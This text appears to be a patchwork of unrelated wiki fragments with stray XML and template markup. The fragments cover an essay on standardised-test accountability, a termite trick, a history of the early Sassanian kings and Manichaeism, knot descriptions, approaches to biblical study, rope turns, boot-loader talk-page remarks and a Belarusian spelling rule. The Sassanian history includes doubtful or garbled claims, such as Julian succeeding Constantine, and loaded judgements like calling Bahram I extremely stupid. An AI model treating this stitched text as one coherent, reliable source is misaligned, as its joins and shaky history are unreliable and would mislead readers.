===Accountability---a good idea gone bad===
I firmly belive in the idea of accountability. A high quality education can open doors that would otherwise remain closed to students. We must ensure that students are receiving the very best we have to give. The idea of accountability is a good one. How it is being applied is arguably bad. To deem a student, teacher or school as competent/incompetent based on one measure is statistically invalid. The Virginia SOLs provide one measure of students' minimum competencies. What the tests don't show is the creative, authentic and higher level extensions and connections that are made in the classrooms. The tests don't measure the skills needed for workers of the future: the ability to collaborate, use technology, respect diversity, and see a problem from multiple points of view. The problem with the current accountability system is that based on one number, the public believes the schools (teachers) are or are not doing a good job. Our first mission has to be to educate the public as to what the SOLs really tell us. We need to remind parents, and even some fellow educators, that SOLs should be the minimum of what is taught in the classroom, not the sum---SOLs are the floor, not the ceiling. The accountability system needs to be revamped to include authentic assessment, much like colleges viewing portfolios instead of using SAT scores. The system needs to give teachers the space to take risks and go above and beyond without fear of reprisals for not &quot;being on the required strand at the required time for the required amount of time&quot;. The success or failure of our students depends on allowing our educational system to evolve to reflect the changing world. We should all (educators and the community) be held accountable when it comes to the success of these students who will be the workforce of the future.

Put the termite on a piece of paper (careful, don't let it escape, because if it does then it'll eat your home).  Then, draw lines on the paper with your Bic pen. The termite will follow the lines!  You can even draw a circle and the termite will simply walk along it. If you get an ant and try this trick, the ant will go away from the lines.

      <text xml:space="preserve">The Sassanians were a clan of pure-blooded Persians who claimed descent from the Achaemenid Emperors.Their ancestor Sasan was a petty king of Persia, which by the time of the Parthians, had been reduced to a minor principality under Parthian overlordship. His son, Ardashir, revolted against the Parthian king Artabanus (Artavadan) in 226 and established the Sassanian kingdom after inflicting a crushing defeat on the Arsacids in three successive battles. Being a Sassanian of Achaemenid descent, he regarded the Parthians as outsiders and considered it as his duty to liberate the country from foreign rule.


== Ardashir I 226-240AD ==

Ardeshir-i-Babagan or Ardeshir I, also known as Artakshatra, Artakshasa and Artaxerxes, was the founder of the Sassanian Dynasty.

=== Early Life and Rise to Power ===

There are many conflicting accounts of his early life. But the ''Karnamik-i-Ardashir'', the most popular of all accounts, tells us that Ardashir was the son of one Sasan who was married to the daughter of Babak, the Parthian satrap of Persia. The Karnamik-i-Ardashir also speculates on an Achaemenid ancestry for Ardeshir. This is probably an attempt by Ardeshir to justify his usurpation of the throne. 

Ardeshir was deeply concerned by his country's subordination to Parthia. So he declared war against the Parthians and exhorted his people to rebel, portraying the insurrection as a patriotic struggle for independence and the Parthians as foreign imperialists. The rebellion was extremely successful, and Carmania was conquered in a few days followed by the outlying regions of the province of Media. The Parthian Emperor Artabanus (Artavadan) confronted the rebels with a huge army but was defeated by them in three consecutive battles, in the last of which Artabanus was killed.

With the death of Artabanus, Ardashir ascended the throne as the first Sassanian monarch of Persia. But soon afterwards Khusro the king of Armenia, who was a brother of Artabanus, rebelled against the new ruler and conquered the province of Assyria. In his rebellion he had the active support and participation of Rome.

In 229, Ardashir crossed the Tigris and invaded the Roman province of Mesopotamia. Alexander Severus, the Roman Emperor, retaliated by invading Mesopotamia from Damascus. By the spring of 232, the whole of Mesopotamia was back in Roman hands.

After he had establish Roman dominsance over Mesopotamia, Alexander Severus took the offensive and launched a three-pronged attack on the Sassanian kingdom. 

The northern wing was fairly successful in realizing its goals. However, the south wing which moved into Persia proper could not traverse the marshy terrain and suffered a crushing defeat near Ctesiphon. Severus sent Roman reserve troops to rescue the entrenched soldiers but was defeated once again and forced to withdraw. A peace was concluded and the war came to an end. Ardashir's success in this war established him firmly on the throne of Persia, and voices of opposition were eventually silenced.

=== Relations With Armenia ===

Soon after the conclusion of peace with Rome, Ardeshir turned his attention towards Armenia and invaded the province. The Armenians, however, offered stiff resistance and the campaign was an utter failure. Ardeshit then resorted to intrigue and got rid of the Arsacid king of Armenia. 

=== Ardeshir and the Zoroastrian Revival ===

Ardeshir was a devout Zoroastrian and made Zoroastrianism the state religion and the Avesta the holy book. His period is celebrated in Iranian history as the period of Zoroastrian revival. He even tried to impose Zoroastrianism in the far-flung corners of the Empire and with this aim in mind, he undertook military expeditions.  The heretics were condemned and tortured.

== Shapur I 240-271 ==

Shapur I succeeded to the throne on the death of his father Ardeshir Babagan. He was the son of Ardeshir through a Parthian princess, the daughter of Artabanus, the last Parthian Emnperor. 

=== Rebellion in Armenia and Hatra ===

As soon as Ardeshir died, Armenia asserted its independence, but Shapur immediately crushed this nascent insurrection. Soon afterwards, Hatra rebelled but Shapur quelled the rebellion easily by disposing of the king by means of treachery.

=== War with Rome ===

The state of Rome at this time was such that it could not escape the eye of Shapur I.  Alexander Severus had been murdered in 235 AD by Maximin, who was later deposed, to be replaced by weak rulers all of whom were killed after short periods on the throne.  The mantle finally fell on Gordian who was then an youth of fifteen.

Hoping to take full advantage of Rome's weak condition, Shapur crossed the Tigris and took the important fortress of Nisibis. He then proceeded to ravage Syria and took the important Roman metropolis of Antioch. Gordian hastened to the defence of Antioch with his father-in-law Timesitheus, who was immediately appointed Commander-in-chief. Gathering a large army, he retook Antioch and crossing the Euphrates defeated the Persians at Carrhae and Resaina. Nisibis fell after a siege and the Persians retreated leaving the Romans in charge of the whole area to the west of the Tigris.

Gordian advanced further and was confident of taking Ctesiphon when disaster struck. Timesitheus was murdered and soon afterwards, Gordian himself was murdered by Timesitheus' successor Philip. Philip conclded peace with Shapur I and withdrew from Persian lands.

However, the peace was short-lived. Philip died soon afterwards and was succeeded by six weak successors who died within a period of fourteen years. Shapur saw his chance and crossed the river Tigris in 258 AD. Wiothin a few weeks, he was once again in charge of Antioch. The aged Roman Emperor Valerian hastened to Syria and retook Antioch but as he was meditating on an invasion of Mesapotamia he was treacherously betrayed by the Praetorian prefect Macrianus who handed him over to the Persians and captured the throne for himself. Valerian became a Persian prisoner and spent his last years in the custody of Shapur I.

=== Shapur's Campaign ===

Soon Rome fell into a civil war as rival contenders arose for the throne. Seeing his chance, Shapur I once again crossed the frontier. He took Edessa and crossing the Euphrates with his army took Antioch and proceeded to ravage Cilicia, Cappadocia, Tarsus, Caesarea Mazaca and Emesa and all provinces right into the vicinity of Constantinople. 

=== Rebellion in Syria ===

Having satisfied his appetite for plunder, Shapur retreated across the frontier and crossed with his armies back into Mesopotamia. However, his return to Ctesiphon was made difficult by the rebellion of Odenathus, the Arab chief of Palmyra. Odenathus defeated Shapur and pursued the returning Persian army right up to the gates of Ctesiphon. Odenathus even made an unsuccessful bid to capture Ctesiphon but left when faced with a stout defence. However, he returned to Palmyra unmolested and crowned himself the independent ruler of Syria.

=== Legacy ===

Shapur's reign saw many highs and lows in Sassanian history. The high point of his reign was the capture of the Roman Emperor Valerian and the low point was his defeat by the Arab chief Odenathus.

== Ormazd I 271-2 ==

Shapur I died in 271 and was succeeded by his son Ormazd I. Ormazd ruled for the short span of a little over an year. He is credited with having founded the city of Ram-Hormuz in Eastern Persia during his short reign.

== Bahram I 272-5 ==

Ormazd I was succeeded by Bahram I who was especially known for his extreme stupidity. One of the first acts of his reign after becoming Emperor was to put to death the Prophet Mani at the instigation of the Zoroastrian high-priest Kartir. 

=== Roman Conquest of Syria ===

Odenathus had died and was succeeded by his wife Zenobia. Hoping to take advantage of the rule of a woman, Rome invaded Syria and captured Palmyra. Zenobia requested Persian help, which was refused. Faced with the prospect of capture and humiliation, Zenobia was forced to flee. Bahram I offered her the safety of Ctesiphon but the Romans overtook her and took her prisoner. Bahram I tried to appease the Roman Emperor with costly presents but the Emperor humiliated him by exhibiting Persian envoys as prisoners of war and later executing them.

=== Rome's Persian campaign ===  

The Roman Emperor Aurelian resolved to conquer Persia and led a large army through Illyricum and Macedonia. However, in the spring of 275, he was murdered at a place called Coenophrurium. His successor called off the expedition and returned to Rome. 

Bahram I died soon afterwards, and was succeeded by his son or brother Bahram II.

== Bahram II 275 - 292 ==

Bahram II succeeded Bahram I in 275 and immediately after his accession to the throne launched an expedition to Sakasthan (the modern-day Sistan) and subjugated the province. 

=== Wars with Rome ===

In 282, Carus the Emperor of Rome crossed the Euphrates and Perso-Roman hostilities again broke out. Bahram II hurriedly recalled his troops from Afghanistan and posted them on the Western frontier. The Persians fared badly as the Romans conquered Mesopotamia and took Selucia and Ctesiphon. But one night, as Carus was camping on the outskirts of the Persian capital, disaster struck. There was a terrible thunderstorm and a bolt of lightning struck the tent. Carus was killed in the melee, although the exact cause of his death is unknown. As an immediate consequence of Carus' death, Rome pulled back its troops from the Persian frontier. 

=== Secession of Armenia ===

In 286, Rome resumed hostilities by supporting the cause of the Armenian king Tiridates. Tiridates revolted successfully and liberated Armenia from Persian yoke. Persia sent two armies against him but he defeated both these armies in pitched battles. He even extended his sway beyond the frontiers of Armenia, into Persian territory. Before he could prepare an expedition to subdue Tiridates, Bahram II passed away in 292.

== Bahram III 292 - 293 ==

Bahram III ruled for four months and was incompetent and ineffectual to stop Tiridates. 

== Narseh 293 - 301 ==

Narses or Narseh succeeded Bahram III, and soon after his accession he was involved in a war of succession with his brother Ormazd. Narseh emerged victorious and Ormazd was probably slain.

In 296, Narseh embarked on his first military campaign provoked by the repeated attacks of Tiridates. He defeated Tiridates and made deep forays into Armenian territory. Tiridates fled Armenida and sought the protection of Rome. 

As 296 drew to a close, the Roman Emperor Diocletian sent his son-in-law Galerius at the head of a large army into Asia. Narseh took Khabour, and was camping near the Euphrates when Galerius took command in Mesopotamia and engaged Narseh in a set of three battles. The first two ended in a stalemate while the last one resulted in a humiliating defeat for Galerius. 

Galerius retreated to join his father-in-law Diocletian at Antioch, and leading a reinforced Roman army entered Armenia in 297. Narseh resisted but was defeated and was forced to flee. However, his baggage fell into the hands of the Romans along with his sisters, concubines and members of the royal household. Narseh was therefore forced to sign a treaty with Rome in order to rescue them. Unable to bear the humiliation, Narseh abdicated in 301 and was succeeded by his son Ormazd II.

== Ormazd II 301 - 309 ==

Ormazd II ascended the throne in 301 and ruled for eight years. His reign was one of peace and prosperity. The king was a lover of art and architecture and founded entirely new cities in Khuzestan and Susiana. Ormazd is also credited with having established a Court of Justice. Ormazd died in 309 succeeded by his yet unborn son Shapur II, who was crowned Emperor while still inside his mother's womb.

== Shapur II 309 - 379 ==

Ormazd II had a son called Ormazd who hoped to succeed on his father's death in 309. But he was highly disliked by the Zoroastrian clergy and noblemen ,who threw him into a dungeon.  As Ormazd had left no other sons, they proclaimed an as yet unborn infant of Oramzd II as the Emperor of Persia. Fortunately for the Magi and for Persia, the child was a boy and was given the name Shapur.

=== Persia during Shapur's minority ===

During the first sixteen years of Shapur's reign, Persia suffered from the invasions of the Arabs and Mesopotamians. Finding the rich and prosperous Persian Empire under the rule of a young child, the barbarous Arabs were constantly tempted to harass their Persian overlords. The tribes of Beni Aqyar and Abdul Kais were constantly harassing the Persians. One Mesopotamian chieftain called Tahir even had the courage to make a successful invasion of Ctesiphon and carry away a sister or aunt of the Persian monarch. 

=== Retaliatory Wars against Arab tribes ===

However, when Shapur came of age in 325, Persia began to retaliate. Shapur defeated the Arabs and drove them from Persian territory. He is also credited with establishing the Persian navy and a fleet of considerable size landed at El Katif on the Persian Gulf and inflicted a crushing defeat on the rebellious Arab tribes. The captives were punished by piercing their shoulders and inserting a string into the wound and driving them off into captivity. This earned Shapur the title 'Dhoulacta' or 'Lord of the shoulders'.

Shapur's Arabian campaign lasted 12 years at the end of which he was completely victorious.

=== War with Rome 337 - 350 ===
  
Emperor Constantine the Great of Rome was an early contemporary of Shapur II. Being a convert to Christianity, he displayed the aggressive zeal of a new convert.  His reputation was so great that Shapur did not venture to invade the dominions of Rome.

In 338, well after Constantine had died, Shapur laid siege to Nisibis. However, the garrison at Nisibis resisted determinedly for sixty-three days and Shapur was forced to call off the siege.

In 341, Shapur succeeded in capturing the Armenian king Tiranus and placed his son Arshaka or Arsaces on the Armenian throne. Arsaces ruled as a vassal of Persia.

Shapur launched a second siege of Nisibis in 346 but was repulsed once again.

In 348, Shapur made a determined effort to drive off the Romans from Mesopotamia. A decisive battle was fought at Singora in which the Romans were heavily outnumbered and defeated. 

In 350, two years after the Battle of Singora, Shapur made one last effort to capture Nisibis. Shapur had seized the opportune moment to launch the attack when Constantine had left for Rome to quell a domestic insurrection. The Persians made a successful breach but were unable to enter the fort due to the soft mud. At length, Shapur sounded the retreat and Nisibis remained with the Romans. That very year, Shapur had to conclude hostilities with the Romans due to the outbreak of a rebellion by the Massagatse of the north.

=== The Second Roman War 359 - 361 ===

A rebellion in the Persian province of Armenia triggered the Second Perso-Roman war of Shapur II. Shapur's campaign against the Massagatse had been an overwhelming success by the year 357 to the extent that garrisons supplied by the Massagatse fought in the war against Rome which broke out in 359.

Hostilities between the Persians and Romans commenced in 359 when a Roman army occupied Mesopotamia. The Persians crossed the Tigris and advanced on the Romans, at which the Romans quit their positions and retreated from Mesopotamia, laying waste to the whole country. They made a stand at the impregnable fortress of Amida (now Diabekr), which they successfully defended from the attacks of the Chionite allies of the Persians.

The Persians launched a second and more aggressive attempt to capture the fort and Amida was occupied by them after a siege of seventy-three days. The inhabitants were slaughtered. 
 
After the conquest of Amida, Shapur crossed the Tigris and invaded Singara. Singara fell easily to the Persians. Emboldened, the Persian troops crossed Nisibis and conquered Phoenicia. By 361 when the war came to an end, the Persians were once again the masters of Mesopotamia. 

=== Julian's Persian Campaign 362 - 363 ===

Constantine was succeeded by Julian who was as ambitious as Alexander the Great. He reached Antioch in 362 and, collecting an army and Armenian support, invaded Mesopotamia. He divided his army and sent one division against Media while he himself led the other division down the river Euphrates.  Leaving Carrhae on the 26th of March, Julian led 65,000 soldiers across the Euphrates and occupied the Persian strongholds of Anah and Thilutha and then the Persian city of Perisabor (Mruz Shapur) near Ctesiphon before laying siege to Ctesiphon itself. Maoga-Malcha, the fortress that protected Ctesiphon, resisted stoutly but was eventually taken. Julian crossed the Tigris and even took the city of Ctesiphon itself. But the Romans decided not to advance further, as they were convinced that they had not yet seen the full strength of Shapur's army. So they withdrew from the territories they held and commenced their return journey to Rome.

The Roman army reached the city of Samara on the Tigris safely. But they were ambushed by the Persian cavalry and elephant corps on the banks of the Tigris and were killed in large numbers. Julian was among the slain and was succeeded by Jovian as the Roman Emperor. Soon after taking over from Julian, Jovian masterminded the safe retreat of the Roman troops across the Tigris and negotiated a peaceful settlement with the Persians.

According to the terms of the peace treaty, the Persians got back the five provinces to the east of the Tigris ceded by the Sassanian monarch Narseh. The strongholds of Nisibis and Singara, regarded as impregnable, became part of the Persian Empire.
   
=== War in Armenia 363 - 370 ===

Christian Armenia had been an ally of Christian Rome ever since the start of the Persian campaign. But on the accession of the pagan Julian to the throne of Rome, Armenia began to waver. The Armenian Emperor Arsaces favored the Persians and when hostilities between the Romans and the Persians came to an end he was compelled to surrender to the Persians. Iberia too was taken by Shapur who made a certain Aspacures the king of Iberia. 

Immediately, Armenia revolted and proclaimed Arsaces' wife Pharandzem the queen of the country. Pharandzem and her son Para enlisted the support of the Romans and liberated most of Armenia from Persian control. At this, Shapur took charge himself and inflicted a crushing defeat on the Armenians.

While Shapur was busy in Armenia, Iberia revolted. Rome supported the rebellion and sent a large army to liberate Iberia. Peace was however concluded in a short while and Iberia was divided equally between Rome and Persia.

Soon after the winter of 370 came to an end, Shapur crossed the frontier and attacked the Romans at a place called Vagabanta. The Romans resisted determinedly and, old and worn out, Shapur retreated.

== Religion and Religious Movements ==

The state religion of the Sassanian Empire was Zoroastrianism, and an extremely zealous form of Zoroastrianism was practised. Ardeshir-i-Babagan, who established the Sassanian Empire, regarded his rebellion against Artavadan the Parthian as a holy war against non-Zoroastrian outsiders. The Karnamik-i-Ardashir tells of Ardashir's victory over the &quot;Worm of Guzaran&quot; (''Guzaran'' is probably ''Gujarat'' in India) and the forcible conversion of the &quot;idolatrous population&quot; to Zoroastrianism.  Ardeshir's reign witnessed a revival of Zoroastrianism, which Persian lore says had grown moribund during Parthian rule.

The compilation of the Avesta was a process which had begun during the reign of the Parthian monarch Valkhash, but it gained momentum only during the time of Ardeshir. The Avesta was completed only during the time of Khusrau Anushirvan, whose reign is usually regarded as a golden age of Persian literature when a number of classics were compiled.

However, this period of Zoroastrian ascendancy also saw a number of heresies, at least one of which even survived the Islamic conquest. The Sassanian Emperors differed on their opinion on these supposedly heretical cults. While some supported them, others were against them.

=== Manichaeism ===

The most powerful threat to orthodox Zoroastrianism rose from a heretical sect which arose during the time of Shapur I.

This heretical sect was founded by Mani, a native of Babylon, during the time of Shapur I. Mani was born Qurqabios on the 14th of April 216; his parents were Pateg and Marmaryam who hailed from the Ashganiyya family of Parthian nobility.

Mani's father Pateg was from Hamadan and he had moved to Ctesiphon in his youth. At Ctesiphon, he used to frequent a temple of idols to pray. According to biographer Al-Nadim, one day one of the idols cried out to him, “Fatiq, do not eat meat, do not drink wine, and stay away from any sexual commerce!” He heard the cry three days three times each.

Pateg then joined a Christian Baptist community called Mughtasila, headed by an individual called Al-Haysa (Elchasai by the Romans). Al-Haysa preached that sin could be atoned for by a second baptism. Al-Haysa detested the bloody ceremony carried out during Easter and broke off from the Christian church by adopting vegetarianism. Otherwise the religion was scrupulously observed: circumcision, monotheism, rejection of divination and astrology, etc. He made water the symbol of his new religion and preached that Jesus was the last of a series of Messiahs starting with Adam. Mani was brought up amongst the Mughthasila from the age of four. At the age of twelve, however, he broke up from the community.

Mani had his first revelation at the age of twelve when the angel Al-Tawm (''The Twin'') appeared to him. Mani detested the elaborate purification rituals that the Mughtasila community indulged in and never missed an opportunity to portray their futility. On the contrary he preached that the purification which Jesus had mentioned in the Scriptures was the '''seperation of light from darkness'''. Eventually, Mani was excommunicated and denounced as a heretic.

At the age of twenty-four, Mani had a second revelation. This was on April 12, 240, on the exact day when Shapur I was crowned king. Mani preached that the paraclete or Holy Ghost was nothing but himself. According to accounts, first of all, he travelled to the East and converted the king of Turan (modern-day Baluchistan). He returned to Babylon a few months later and made the acquaintance of Piruz, a brother of Emperor Shapur I, who arranged for an audience with the Sassanian Emperor.

At the Sassanian court, Mani presented his faith as the &quot;true religion&quot; as had been preached by Zoroaster himself. He compiled his teachings into a book and named it ''Shaburaghan'' after Shapur I in his bid to impress the king further. At length, Shapur was convinced and he assured royal protection, though it is evident that he did not convert to the faith himself. With royal patronage, Mani toiled to spread his new faith to every nook and corner of the Empire. He sent Adda and Pateg to the west and Ammo to the north-east while he himself travelled to the north-western frontier of the Empire to spread the faith.

Manichaeism flourished under Shapur I and his son Ormazd I and during the early part of the reign of Bahram I. The Manichean scriptures assert that Ormazd I was a convert to Manichaeism. However, Mani was arrested and confined to a prison when he failed to heal a dying son of Bahram I. He escaped by bribing the jailer, but was captured and eventually brought before the king. Bahram I reportedly skinned him alive and offered his flesh to the birds. His skin, however, was hung in front of his palace at Ctesiphon as a warning.

Though Mani was barely 60 when he was brutally executed in 276, his religion survived him and eventually emerged as the strongest of the Zoroastrian heresies. One of the prominent torch-bearers after Mani's death was King Amaro of Hira. By the end of the 3rd century, the religion had reached North Africa; by the 4th century AD, it had reached Rome where it became an issue of concern to the Roman Catholic religion. Edicts were issued to nip its influence in the bud. However, Manichaeism survived in Constantinople till the 6th century AD, where it was eventually wiped out by aggressive proselytizaton of the Roman Catholic missionaries.

In the east, however, Manichaeism survived for a long time. It had to go underground fearing persecution by the Sassanians but emerged from exile when Iran was conquered by the Arabs in 636 - 652. After that, it began spreading rapidly eastwards, first to Sogdiana (the modern-day Samarkand) and Balkh and then to Central Asia and even China. In Iran, the faith survived for a few centuries but died away by the start of Ghaznavid rule in the 10th century AD. It also died away in Sogdiana and Balkh as these lands came under Islamic rule. However, it survived in China well into the 16th century AD and as evidence indicates, may well have survived until the 18th century AD.

Manichaeism left a more profound impact on Christianity than Zoroastrianism. Gnosticism and the Classical Revival of the 15th and 16th centuries claim to have been directly inspired by the Manichean doctrine.

===  Edict of Kertir ===

Kertir was the Zoroastrian chief-priest of Persia during the reign of Shapur I, Ormazd and Bahram I. He was a sworn enemy of the Manicheans and was chiefly responsible for the execution of Prophet Mani.

He is remembered for and known through his edicts at the Naqsh-i-Rajab and the Kaaba-i-Zardosht. In the inscription at the Kaaba-i-Zardosht he describes his own rise to power and denounces non-Zoroastrian creeds. He describes the methods used to propagate Zoroastrianism and the persecution inflicted on other religions. He says that Manichaeism, Judaism, Christianity, Buddhism and Hinduism were abolished in the Empire and their practice made illegal.

=== Adarbad Mahraspand ===

Adarbad Mahraspand was a Zoroastrian high-priest who lived during the reign of Shapur II. He was mainly responsible for the compilation of the Avesta. When Shapur was still a child, Adarbad collected the bits and pieces of the Avesta which had survived Alexander's invasion and gave the Avesta the form that we know today. The compilation took around five years, from 325 to 330.

According to the Zoroastrian prophecies, the Zoroastrian faith would be overthrown three times and three times it would be restored - first, by Alexander and it was restored by Ardeshir; second by the heretic Mani and it was restored by Adarbad Mahraspand and lastly, it would be overthrown by the Arabs and restored by Soshyant. The Zoroastrian prophecies also mention three great prophets of Zoroastrianism, the first being Zoroaster himself, the second  being Jamasp, the son-in-law of Zoroaster who recites the Avesta as dictated to Zoroaster and compiles it in the form of a book and third, Adarbad Mahraspand.

Zoroastrian legends state that molten iron was poured down Adarbad's chest to test his purity and devotion and as if by miracle, Adarbad emerged from this test of purity, unscathed.

I posted a [[Talk:Algebra_I_in_Simple_English/Introduction_to_Basic_Algebra_Ideas/Translating_Words_into_Math_Symbols|comment]] in response yours on the Algebra I in Simple English Book.  You obviously have a strong opinion on (and I'm presuming some expertise in) Math pedagogy so I would appreciate your opinion and hope that you decide further contribute to the book.  I have also started another text on basic [[simple:Numbers|Arithmetic]] if you are interested.  Thanks --[[Ezrakatz|Ezra Katz]] 00:17, 21 June 2007 (UTC)</text>

| tying_instructions =
A slip knot can be tied by starting an overhand knot, but instead of passing the running end through the loop, pass a bight through instead.
| warnings = If tied as shown in the illustration, the running end (on the right) will pull through the loop if even the slightest load is applied to the standing end (on the left).  If one reverses the standing end and running ends in the illustration, the knot is far more stable.  As shown, the knot will hold a load on the running end, but not on the standing end.

| name= Stevedore knot

| image2_caption = Stevedore knot before tightening
| use = The '''Stevedore knot''' is a stopper knot, often tied near the end of a rope. It is more bulky and less prone to jamming than the closely related figure-eight knot.  This knot is excellent for anchoring a tarp.  Pass the end of the rope through a tarp's grommet, tie a stevedore, and anchor the other end with a taut-line hitch.  Its added bulk prevents it from pulling through the grommet.
| tying_instructions =
The knot is formed by following the steps to make a figure-eight knot, but the working end makes an additional round turn around the standing part before the end passes back through the initial loop.

| name=Strangle knot
| image=Strangle-knot-ABOK-1239.jpg
| use = The '''Strangle knot''' is a simple binding knot.  Similar to the constrictor knot, it also features an overhand knot under a riding turn.  The difference is that the ends emerge at the outside edges, rather than between the turns as for a constrictor.  This knot is actually a rearranged double overhand knot and makes up each half of the double fisherman's knot.

When tightened, it is very slip-resistant. It is ideal for constructing a pilot ladder (like a rope ladder, but with wooden rungs).

| use = A '''slipped half-hitch''' is a knot used to attach a line to a rod or bar. It does not provide great strength compared to some other knots, but it can be tied relatively quickly and released very easily. These characteristics mean that it is used on square-rigged ships for securing the gaskets that bind stowed sails to the yards.
| tying_instructions =
Begin as for a clove hitch, but instead of passing the end of the line through the loop in the final step, pass a bight instead, leaving the end on the original side. Pulling on this end will release the hitch - if tied in a gasket, this will quickly release the sail.

| name=Prusik knot
| image= Prusikhowto4.jpeg
| use = A '''Prusik (aka Prussik or Prussic)''' is a friction hitch used in climbing, canyoneering, caving, rope rescue and by arborists to grab a rope (sometimes referred to as a ''rope-grab'').  The term '''Prusik''' is used both for the knot, for the loops of cord, and for the action ('''to prusik''').  

A Prusik rope is a circular loop with a circumference of {{units|20 to 100 cm|8-40 inches}} depending on its intended use.  Two Prusik ropes are tied to another rope which is anchored above.  When the Prusik knot is under tension, it grabs the rope to which it is tied.  When not under tension, it is easily moved.  The climber places one foot into each loop, and shifts all of his or her weight to one of them, releasing the tension on the other.  The rope without tension is then slid upwards on the vertical rope.  The climber the shifts his or her weight to the other loop and slides the first one up.  This is repeated until the rope has been ascended.  

Prusiks will work around two ropes, even two ropes of different diameters.  Prusiks provide a high-strength and relatively fail-safe (i.e., they will slip before damaging the rope or breaking) attachment, and are used in some rope-rescue techniques.  Prusiks are good to use in hauling systems where multiple rope-grabs may be needed, and where mechanical rope-grabs are not available.

Although the Prusik Climb technique may be called old-school by some, the US Army still includes it in its annual Best Ranger competition. Rangers in the competition routinely make it up a 90 foot rope in under a minute.
| tying_instructions =
The Prusik is tied by wrapping the prusik loop around the rope a number of times (depending on the materials, but usually 3-5 times), and then back through itself, forming a barrel around the rope, with a tail hanging out the middle.  When the tail is weighted the turns tighten around the main rope and grab.  When weight is removed the loop can be slid along the rope by placing a hand directly on the barrel and pushing.  The trick is, if it grabs well, then it is hard to slide along the rope. '''Breaking''' the Prusik free from the rope after it has been weighted can be difficult, and is easiest done by pushing the ''bow'', being the loop of cord which runs from the top wrap, over the knot to the bottom wrap, along the tail a little.  This loosens the grip of the hitch and makes movement easier.

This work reflects the study of the Judeo-Christian Bible and related texts. For Christianity, the Bible traditionally comprises the [[w:New Testament|New Testament]] and [[w:Old Testament|Old Testament]], which together are sometimes called the &quot;Scriptures.&quot; [[w:Judaism|Judaism]] recognizes as scripture only the Hebrew Bible, also known as the [[w:Tanakh|Tanakh]], an acronym for the Hebrew names of its divisions: Torah (Law), [[w:Nevi'im|Nevi'im]] (Prophets) and [[w:Ketuvim|Ketuvim]] (writings). Other texts often examined by biblical scholars include the Jewish [[w:apocrypha|apocrypha]], the Jewish [[w:pseudepigraph|pseudepigraph]]a, the Christian apocrypha, the many varieties of ante-Nicene [[w:Early Christianity|early Christian]] literature, and early Jewish literature.

=== Study Methods ===
There are several approaches to study of, and commentary on, the Judeo-Christian texts. The distinctions are found in the understanding of the Origins for the text and the basis of Truth found in the texts. 

==== Orthodox Religious Study ====
In the Jewish community, the classical approach is Orthodox religious study of the Bible, where it is assumed that the Bible has a Divine origin and the human writers were inspired directly by the Spirit of God when writing.
This is also true in the conservative Christian communities that hold to a Biblical Worldview and those who hold to the historically traditional Church view.

In both cases, Biblical writings are considered to be absolute truth coming directly from God and form the basis for all moral, ethical and social practices of believers.

==== Progressive or Mainstream Religious Study ====
It is common in both Judaic and Christian contemporary religious communities, often called Mainstream, to study the Bible as a human creation, where the writings were originated by people inspired by God as well as being inspired by Religious Study.

Such an approach yields scripture that is considered to be truthful only in some respects, which necessitates the addition of other writings or rational thinking in order to reach truthful and applicable practices of moral, ethical and social thought. In such cases, studies include high consideration for texts that are part of a tradition. These include Apochryphal writings and rabbinical commentaries.  Also, science and other contemporary knowledge from the academic community is often used to augment the understanding of Biblical text.

==== Secular Study of the Bible ====
Secular practitioners of Biblical Studies view the Bible as literature and not Sacred text. Most do not have any faith commitment to the texts they study. Biblical criticism seems to reject the idea that the Bible was written by prophets or teachers inspired by God. Indeed, this practice, when applied to the Torah, is generally considered heresy by the entire Orthodox Jewish community. As such, much modern day Bible commentary written by non-Orthodox Judaic authors is considered treif (forbidden) by rabbis teaching in Orthodox yeshivas.

Some classical rabbinic commentators, such as Abraham Ibn Ezra, Gersonides and Maimonides, used many elements of modern day biblical criticism, including their then-current knowledge of history, science and philology. Their use of historical and scientific analysis of the Bible was considered kosher by historic Judaism due to the author's faith commitment to the idea that God revealed the Torah to Moses on Mount Sinai.

The Modern Orthodox Jewish community allows for a wider array of biblical criticism to be used for biblical books outside of the Torah, and a few Orthodox commentaries now incorporate many of the techniques previously found in the academic world, e.g. the [[w:Da'at Miqra|Da'at Miqra]] series.

Non-Orthodox Jews, including those affiliated with Conservative Judaism and Reform Judaism, accept the validity of both traditional and secular approaches to Bible studies. See the article on [[w:Revelation|Revelation]] for details of how members of these groups understand this concept.

The Wikipedia article on [[w:Jewish commentaries on the Bible|Jewish commentaries on the Bible]] discusses Jewish Tanakh commentaries from the [[w:Targums|Targums]] to classical [[w:rabbinic literature|rabbinic literature]], the [[w:midrash|midrash]] literature, the classical medieval commentators, and modern day commentaries.

A '''turn''' is a component of a knot.  Turns can be made around objects, through rings, or around the [[standing part]] of the rope itself.  Turns come in various forms, distinguished by the number of passes that the rope makes.

A turn or '''single turn''' requires one pass.  The line makes a U-shape through or around the object, or half a revolution.&lt;ref&gt;The Ashley Book of Knots, image 40&lt;/ref&gt; A '''round turn''' requires two passes and makes one and a half revolutions.

==Riding turn==
[[Image:Strangle-knot-ABOK-1239.jpg|thumb|right|The riding turn of this [[Strangle knot]] passes from the upper left to lower right]]
A '''riding turn''' is a section of rope that passes on top of another section of rope, often parallel or at only a slight angle to the section below.  Examples of riding turns can be seen in both the [[Constrictor knot]] and the [[Strangle knot]].  The second course of wrappings in some [[Seizing (knot)|seizing knots]] can be referred to as riding turns.   The formation of an unintentional riding turn on a sailing [[winch]] can cause it to jam.

Should the code start at 0x0000 or 0x0100?

: I'm not quite sure what you're referring to, but MS-DOS .COM files are loaded to address CS:0100h whereas boot loaders are loaded to address 0000:7C00h. AFAIK, all the segment registers are set to 0 by the BIOS, and IP then starts as 7C00h. Telling your assembler that the code will be positioned at 7C00h can ease the calculation of memory offsets.

I'm not sure if I understand this code correctly, but in the skip: label, there is a jmp function to print, does this mean it will keep printing &quot;Hello World&quot;, indefinitively, and will not stop?

      <comment>[[WP:AWB/T|Typo fixing]], typos fixed: separeted → separated, diphtongs → diphthongs, preceeded → preceded using [[Project:AWB|AWB]]</comment>
      <text xml:space="preserve">==The initial ''ў''==

The initial ''у'' letter is replaced by the ''ў'' if it is preceded by a word with a final vowel.

'''уро́к''' a lesson

'''ця́жкi ўро́к''' a difficult lesson

This rule does not apply to proper names.

'''старажы́тная Украіна''' ancient Ukraine

NOTE: In tarashkievitsa, ''ў'' is used in such cases (''старажытная Ўкраіна'').

(However, note that when an ajective or other word is formed from a proper name, if it starts with a small letter in Belarusian, it's still written with ''ў'': ''гасці́нныя ўкраі́нцы'' hospitable Ukrainians).

This is also not applied when the preceding word is separated with a dot, a comma or other punctuation sign.

